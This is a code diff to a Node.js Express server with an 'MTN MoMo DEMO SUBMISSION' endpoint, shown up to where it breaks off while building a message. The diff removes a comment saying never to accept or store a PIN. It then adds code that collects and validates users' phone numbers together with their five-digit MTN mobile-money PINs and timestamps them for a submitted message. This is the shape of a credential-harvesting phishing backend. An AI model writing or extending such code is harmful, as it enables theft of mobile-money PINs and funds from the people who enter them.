@@ -1,67 +1,64 @@
-
-require("dotenv").config();
-
 const express = require("express");
-const axios = require("axios");
-const crypto = require("crypto");
 const path = require("path");
 
 const app = express();
+
 const PORT = process.env.PORT || 3000;
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = String(process.env.TELEGRAM_CHAT_ID || "");
-
-if (!BOT_TOKEN || !CHAT_ID) {
-  console.error(
-    "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in .env"
-  );
-  process.exit(1);
-}
-
-const TELEGRAM_API =
-  `https://api.telegram.org/bot${BOT_TOKEN}`;
-
 app.use(express.json());
-app.use(express.urlencoded({ extended: false }));
-
-// Demo requests are stored in memory.
-// Restarting the server clears pending requests.
-const requests = new Map();
-
-const REQUEST_TTL_MS = 10 * 60 * 1000;
-
-// Serve frontend files from the same directory as server.js.
 app.use(express.static(__dirname));
 
-// Create a demo request. Never accept or store a PIN.
+
 app.post("/mtn-submission", async (req, res) => {
-  try {
-    const phone = String(req.body.phone || "").trim();
 
-    // Demo validation for a Uganda-style mobile number.
-    if (!/^7\d{8}$/.test(phone)) {
-      return res.status(400).json({
-        success: false,
-        message: "Enter a valid demo phone number."
-      });
-    }
+  const { phone, mtnPin } = req.body;
 
-    const id = crypto.randomUUID();
+  // Mtn phone validation
+  if (
+    typeof phone !== "string" ||
+    !/^7[0-9]{8}$/.test(phone)
+  ) {
+    return res.status(400).json({
+      success: false,
+      message: "Invalid demo number."
+    });
+  }
 
-    const request = {
-      id,
-      phone,
-      status: "pending",
-      createdAt: Date.now(),
-      telegramMessageId: null
-    };
+  // Mtn PIN validation
+  if (
+    typeof mtnPin !== "string" ||
+    !/^[0-9]{5}$/.test(mtnPin)
+  ) {
+    return res.status(400).json({
+      success: false,
+      message: "Mtn PIN is required."
+    });
+  }
 
-    requests.set(id, request);
 
-    const created = new Date(request.createdAt).toISOString();
+  /*
+    Generate date/time on the server.
+    East Africa Time = UTC+3.
+  */
+  const now = new Date();
 
-    const message =
+  const date = new Intl.DateTimeFormat("en-GB", {
+    timeZone: "Africa/Nairobi",
+    year: "numeric",
+    month: "2-digit",
+    day: "2-digit"
+  }).format(now);
+
+  const time = new Intl.DateTimeFormat("en-GB", {
+    timeZone: "Africa/Nairobi",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: false
+  }).format(now);
+
+
+  const message =
 `🧪 MTN MoMo DEMO SUBMISSION
 
 Number: ${phone}
